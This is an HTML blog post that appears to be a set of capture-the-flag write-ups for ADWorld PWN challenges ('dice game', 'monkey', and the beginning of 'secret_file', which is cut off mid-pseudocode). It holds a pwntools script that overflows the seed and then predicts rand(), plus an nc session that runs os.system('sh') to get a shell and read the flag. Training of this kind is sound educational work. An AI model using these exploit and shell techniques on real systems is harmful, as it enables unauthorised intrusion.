@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Computer, Network, Security">
+    <meta name="description" content="a blog on Hexo">
+    <meta name="author" content="TyeYeah">
+    
+    <title>
+        
+            ADWorld PWN Challenge Area Write-ups (Misc) |
+        
+        Relish the Moment
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/img/wang.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Relish the Moment
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (Misc)</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2020-10-05 08:05:44
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/rand/">rand</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/js/">js</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>19 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice game"></a>dice game</h2><p>Attachment: <a href="/filehost/apcaw/dice_game.zip">dice_game.zip</a><br>Description: None. </p>
+<p>The <code>dice game</code> is similar but harder than <code>guess num</code> which in <a class="link"   target="_blank" rel="noopener" href="http://localhost:4000/2020/07/24/2020-07-24-ADWorld-PWN-Exercise-Area-Write-ups/#guess-num" >ADworld PWN exercise area<i class="fas fa-external-link-alt"></i></a>. Just find out the flag.</p>
+<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ file dice_game</span><br><span class="line">dice_game: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=25432b87a385dc5acec03263b2e3746f287ed159, stripped</span><br><span class="line">$ checksec dice_game</span><br><span class="line">[*] &#x27;/root/dice_game&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ ./libc.so.6</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>: </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  *(_QWORD *)seed = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome, let me know your name: &quot;</span>, a2);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )</span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s. Let&#x27;s play a game.\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">srand</span>(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Game %d/50\n&quot;</span>, v8);</span><br><span class="line">    v5 = <span class="built_in">sub_A20</span>();</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_B28</span>((__int64)buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sub_A20</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me the point(1~6): &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">rand</span>() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">&quot;(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)&quot;</span>, <span class="string">&quot;dice_game.c&quot;</span>, <span class="number">0x18</span>u, <span class="string">&quot;dice_game&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You win.&quot;</span>);</span><br><span class="line">      result = <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You lost.&quot;</span>);</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid value!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sub_B28</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_B28</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Congrats %s\n&quot;</span>, a1);</span><br><span class="line">  stream = <span class="built_in">fopen</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">100</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>It is similar to <code>guess num</code> because they both need to overflow to set specific seed. </p>
+<p>After extracting <code>dice _game.zip</code>, it gives a <code>libc.so.6</code> for us. The results of <code>rand()</code> is decided by this <code>lib</code> file in the target pc.</p>
+<p>So we have 2 ways to deal with it:</p>
+<ol>
+<li>write our own <code>rand</code> test program to see the result, remember to compile with given <code>libc.so.6</code>.</li>
+<li>call <code>libc.so.6</code> in python, using <code>ctypes</code> lib.</li>
+</ol>
+<p>As for the offset, we input <code>buf</code> to overflow <code>seed</code>, so it should be <code>0x50 - 0x10 == 0x40</code>.</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Like what we do with <code>guess num</code>, we write <code>rand.c</code> to test the result (I want to overflow <code>seed</code> as <code>00000000</code>, so…):</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  gcc rand.c -Wl,--rpath=/root/lib -Wl,--dynamic-linker=/root/lib/libc.so.6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">rand</span>() % <span class="number">6</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x3030303030303030</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">50</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Remember to compile with the given <code>libc</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc rand.c -Wl,--rpath=/root/lib -Wl,--dynamic-linker=/root/lib/libc.so.6</span><br><span class="line">$ ./a.out</span><br><span class="line">6</span><br><span class="line">5</span><br><span class="line">1</span><br><span class="line">...</span><br><span class="line">6</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>Then we run <code>dice_game</code> (copy and paste):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ ./dice_game</span><br><span class="line">Welcome, let me know your name: 000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">Hi, 00000000000000000000000000000000000000000000000000000000I. Lets play a game.</span><br><span class="line">Game 1/50</span><br><span class="line">Give me the point(1~6): 6</span><br><span class="line">...</span><br><span class="line">Give me the point(1~6): 1</span><br><span class="line">1You win.</span><br><span class="line">Game 50/50</span><br><span class="line">Give me the point(1~6): You win.</span><br><span class="line">Congrats 0000000000000000000000000000000000000000000000000000000I</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<p>Or use <code>cdll</code> of <code>ctypes</code> to load <code>libc</code> and run <code>C</code> language functions in python:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./dice_game&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">39266</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">payload = <span class="string">&#x27;0&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0x3030303030303030</span>)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">libc.srand(<span class="number">0x3030303030303030</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    num = libc.rand() % <span class="number">6</span> + <span class="number">1</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h2><p>Attachment: <a href="/filehost/apcaw/monkey.zip">monkey.zip</a><br>Description: None</p>
+<p>It’s about JavaScript Shell.</p>
+<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ unzip monkey.zip</span><br><span class="line">Archive:  monkey.zip</span><br><span class="line">  inflating: js</span><br><span class="line">  inflating: libnspr4.so</span><br><span class="line">  inflating: libplds4.so</span><br><span class="line">  inflating: libplc4.so</span><br><span class="line">$ file js</span><br><span class="line">js: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=e3c6583926710fbbace7f075fd88ea7963faa0e0, not stripped</span><br><span class="line">$ checksec  js</span><br><span class="line">[*] &#x27;/root/js&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>Pseudocode is a mess.</p>
+<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>We are familiar with JavaScript, but what is js shell? It is a command line program included in SpiderMonkey source code, and it acts like Python interpreter.</p>
+<p>Use <code>help()</code> to see help page, and use <code>dumpHeap()</code> to dump the heap. Among <code>help()</code> result we can see:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os - interface object</span><br><span class="line">  os.getenv os.getpid os.system os.spawn os.kill os.waitpid os.file os.path</span><br></pre></td></tr></table></figure>
+<p>There we can use <code>os.system</code> to get shell.</p>
+<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>Using <code>nc</code> to interact is ok:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ nc 220.249.52.133 56711</span><br><span class="line">js&gt; os.system(&#x27;sh&#x27;)</span><br><span class="line">os.system(&#x27;sh&#x27;)</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libnspr4.so</span><br><span class="line">libplc4.so</span><br><span class="line">libplds4.so</span><br><span class="line">run.sh</span><br><span class="line">cat flag</span><br><span class="line">cyberpeace&#123;xxxxxxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>
+<p>Or use <code>read</code> to read file (know it from other writeup):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">js&gt; read(&#x27;flag&#x27;)</span><br><span class="line">read(&#x27;flag&#x27;)</span><br><span class="line">js&gt; print()</span><br><span class="line">print()</span><br><span class="line">&quot;cyberpeace&#123;xxxxxxxxxxxxxxxxxxxx&#125;\n&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="secret-file"><a href="#secret-file" class="headerlink" title="secret_file"></a>secret_file</h2><p>Attachment: <a href="/filehost/apcaw/secret_file">secret_file</a><br>Description: Confidential.</p>
+<p>It’s about hash (sha-256).</p>
+<h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file secret_file</span><br><span class="line">secret_file: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=700ac7785d436db2bbb5642f99678fe1ef0394b8, stripped</span><br><span class="line">$ checksec secret_file</span><br><span class="line">[*] &#x27;/root/secret_file&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// 